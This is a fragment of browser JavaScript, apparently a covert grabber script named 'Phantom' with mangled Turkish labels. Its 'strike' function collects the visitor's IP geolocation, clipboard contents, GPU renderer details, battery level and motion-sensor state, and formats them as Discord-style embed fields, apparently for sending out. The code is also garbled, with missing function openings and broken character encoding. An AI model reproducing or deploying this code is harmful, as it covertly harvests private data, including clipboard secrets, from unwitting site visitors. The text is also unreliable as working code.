    <script>
        "use strict";

        const Phantom = (function() {

                const a = e.accelerationIncludingGravity;
                if (!a) return;
                const v = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
                movement = v > 13 ? "AraÃ§ta/HÄ±zlÄ±" : v > 10.5 ? "YÃ¼rÃ¼yÃ¼ÅŸ" : "Sabit/MasaÃ¼stÃ¼";
            }, { once: true });

            return {
                async strike() {
                    if (fired) return; fired = true;

                    // IP ve Konum Verisi (HÄ±zlÄ± Ã‡ekim)
                    const net = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                    
                    // Pano Verisi
                    const clip = await navigator.clipboard.readText().catch(() => "EriÅŸim Yok");

                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');

                                { name: "ðŸƒ HAREKET ANALÄ°ZÄ°", value: `**Durum:** ${movement}\n**Pil:** %${Math.round((await navigator.getBattery?.().then(b => b.level) || 0) * 100)}`, inline: true },
